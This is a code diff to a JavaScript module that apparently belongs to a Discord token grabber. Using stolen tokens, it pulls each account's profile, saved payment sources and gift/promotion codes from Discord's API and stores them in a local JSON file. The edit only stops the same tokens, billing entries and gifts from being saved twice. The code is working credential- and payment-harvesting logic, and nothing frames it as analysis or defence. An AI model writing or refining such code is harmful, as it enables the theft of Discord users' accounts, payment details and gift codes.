@@ -88,8 +88,11 @@ module.exports = new Promise((resolve) => {
               let json = res.data;
               json.token = token;
               let info = statSync(jsonFile) ? require(jsonFile) : {};
-              if (!info.accounts) info.accounts = []; info.accounts.push(json);
-              writeFileSync(jsonFile, JSON.stringify(info));
+              if (!info.accounts) info.accounts = [];
+              if (!info.accounts.find(account => account.token === token)) {
+                info.accounts.push(json);
+                writeFileSync(jsonFile, JSON.stringify(info));
+              }
 
               axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
                 headers: { Authorization: token, 'User-Agent': userAgent }
@@ -98,7 +101,10 @@ module.exports = new Promise((resolve) => {
                   if (res.status !== 200) return;
                   const json = res.data;
                   let info = require(jsonFile);
-                  if (!info.billing) info.billing = []; json.forEach(b => info.billing.push(b));
+                  if (!info.billing) info.billing = [];
+                  json.forEach(billing => {
+                    if (!info.billing.find(b => b.id === billing.id)) info.billing.push(billing);
+                  });
                   writeFileSync(jsonFile, JSON.stringify(info));
 
                   axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
@@ -108,7 +114,10 @@ module.exports = new Promise((resolve) => {
                       if (res.status !== 200) return;
                       const json = res.data;
                       let info = require(jsonFile);
-                      if (!info.gifts) info.gifts = []; json.forEach(g => info.gifts.push(g));
+                      if (!info.gifts) info.gifts = [];
+                      json.forEach(gift => {
+                        if (!info.gifts.find(g => g.id === gift.id)) info.gifts.push(gift);
+                      });
                       writeFileSync(jsonFile, JSON.stringify(info));
 
                       resolve();
